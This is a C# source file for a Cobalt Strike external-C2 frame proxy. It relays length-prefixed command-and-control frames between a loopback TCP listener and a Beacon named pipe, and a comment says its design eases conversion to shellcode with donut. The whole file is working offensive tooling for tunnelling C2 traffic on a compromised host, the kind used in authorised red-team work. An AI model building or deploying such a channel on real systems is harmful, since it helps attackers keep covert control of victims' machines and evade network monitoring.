using System;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace CSFrameProxy
{
    [ComVisible(true)]
    class FrameProxy : IFrameProxy
    {
        static TcpListener _listener;
        static NamedPipeClientStream _pipeClient;
        static NetworkStream _networkClient;
        static string _logFile;

        // args
        static int _listenPort;
        static string _pipeName;
        static bool _debug;

        /// <summary>
        /// Representation of which action to take first on a stream.
        /// </summary>
        [Flags]
        enum Action
        {
            ReadOnly = 0,
            WriteOnly = 1 << 0,
            Exit = 1 << 1,  // to quit the proxy
        }

        /// <summary>
        /// C2Frame represents a Cobalt Strike frame.
        ///
        /// The C2Frame structure is effectively the same implementation as the
        /// ExternalC2.NET package with some minor tweaks. Full credits to @_rastamouse.
        ///
        ///     Ref: https://rastamouse.me/externalc2-net/
        ///     Ref: https://github.com/rasta-mouse/ExternalC2.NET
        /// </summary>
        public struct C2Frame
        {
            public byte[] Length { get; }
            public byte[] Data { get; }

            public C2Frame(byte[] length, byte[] data)
            {
                Length = length;
                Data = data;
            }

            /// <summary>
            /// Returns the current frame length as an int32
            /// </summary>
            /// <returns></returns>
            public int LengthAsInt32()
            {
                return BitConverter.ToInt32(Length, 0);
            }

            /// <summary>
            /// Convert the frame to a byte[]
            /// </summary>
            /// <returns></returns>
            public byte[] ToByteArray()
            {
                var buf = new byte[Length.Length + Data.Length];

                Buffer.BlockCopy(Length, 0, buf, 0, Length.Length);
                Buffer.BlockCopy(Data, 0, buf, Length.Length, Data.Length);

                return buf;
            }

            /// <summary>
            /// Create a Frame from a byte[]
            /// </summary>
            /// <param name="frame"></param>
            /// <returns></returns>
            public static C2Frame FromByteArray(byte[] frame)
            {
                var dataLength = frame.Length - 4;

                var length = new byte[4];
                var data = new byte[dataLength];

                Buffer.BlockCopy(frame, 0, length, 0, 4);
                Buffer.BlockCopy(frame, 4, data, 0, dataLength);

                return new C2Frame(length, data);
            }

            /// <summary>
            /// Represent a C2Frame as a string
            /// </summary>
            /// <returns></returns>
            public override string ToString()
            {
                return $"C2Frame<.Length = {LengthAsInt32()}, .Data = " +
                    $"{BitConverter.ToString(ToByteArray().Take(10).ToArray())} ..." +
                    $" {BitConverter.ToString(ToByteArray().Reverse().Take(10).Reverse().ToArray())}>";
            }
        }

        /// <summary>
        /// Construct a new FrameProxy.
        ///     Using strings as arguements is weird, but helps with donut 
        ///     shellcode generation and invocation.
        /// </summary>
        public FrameProxy(string pipeName, string listenPort, bool debug = false)
        {
            _logFile = Path.Combine(Path.GetDirectoryName(
                System.Reflection.Assembly.GetExecutingAssembly().Location), "log.db");

            _pipeName = pipeName;
            _listenPort = Int32.Parse(listenPort);
            _debug = debug;
        }

        /// <summary>
        /// Run the proxy by starting the TCP listener and connecting to the upstream named pipe.
        /// </summary>
        /// <param name="pipeName"></param>
        /// <param name="listenPort"></param>
        public void Run()
        {
            _listener = new TcpListener(IPAddress.Loopback, _listenPort);
            _listener.Start();
            Log($"started tcp listener on port {_listenPort}");

            _pipeClient = new NamedPipeClientStream(".", _pipeName, PipeDirection.InOut, PipeOptions.WriteThrough);
            _pipeClient.Connect();
            Log($"connected to upstream pipe {_pipeName}");

            while (true)
            {
                using (TcpClient tcpClient = _listener.AcceptTcpClient())
                {
                    Log($"client connected from: {tcpClient.Client.RemoteEndPoint}");
                    using (_networkClient = tcpClient.GetStream())
                    {
                        // read the action off the stream. our tiny protocol always
                        // expects the first byte to flag what we should do with the
                        // client that connected.
                        int actionByte = _networkClient.ReadByte();
                        Log($"processing action {actionByte}");

                        switch ((Action)actionByte)
                        {
                            case Action.ReadOnly:
                                PipeTransfer(_pipeClient, _networkClient);
                                break;

                            case Action.WriteOnly:
                                PipeTransfer(_networkClient, _pipeClient);
                                break;

                            case Action.Exit:
                                Log("quitting");
                                return;

                            default:
                                Log($"unknown action byte received: {actionByte}");
                                break;
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Transfer a C2Frame from one Stream to another, almost like a pipe.
        /// </summary>
        /// <param name="incoming"></param>
        /// <param name="outgoing"></param>
        static void PipeTransfer(Stream incoming, Stream outgoing)
        {
            string pre = $"[{incoming.GetType().Name} --> {outgoing.GetType().Name}]";
            Log($"{pre} starting frame transfer");

            using (MemoryStream ms = new MemoryStream())
            {
                byte[] lenBuf = new byte[4];
                int read = incoming.Read(lenBuf, 0, lenBuf.Length);
                int expectedLen = BitConverter.ToInt32(lenBuf, 0);
                Log($"{pre} expected length from incoming socket is {expectedLen} " +
                    $"(byte){BitConverter.ToString(lenBuf)}");

                if (read != 4)
                {
                    Log($"{pre} !! did not receive 4 bytes to know the buffer length we need to read");
                }

                ms.Write(lenBuf, 0, lenBuf.Length);

                int totalRead = 0;
                do
                {
                    int remainingBytes = expectedLen - totalRead;
                    if (remainingBytes == 0) break;

                    byte[] buf = new byte[remainingBytes];
                    read = incoming.Read(buf, 0, remainingBytes);
                    ms.Write(buf, 0, read);

                    totalRead += read;
                }
                while (totalRead < expectedLen);

                C2Frame frame = C2Frame.FromByteArray(ms.ToArray());
                Log($"{pre} incoming frame to write: {frame}");

                outgoing.Write(frame.Length, 0, frame.Length.Length);
                outgoing.Write(frame.Data, 0, frame.Data.Length);
            }
        }

        /// <summary>
        /// Write a string to a log file if debug mode is enabled.
        /// </summary>
        /// <param name="message"></param>
        static void Log(string message)
        {
            if (!_debug) return;

            using (StreamWriter w = File.AppendText(_logFile))
            {
                string now = DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss");
                w.WriteLine($"[{now}] {message}");
            }
        }
    }
}
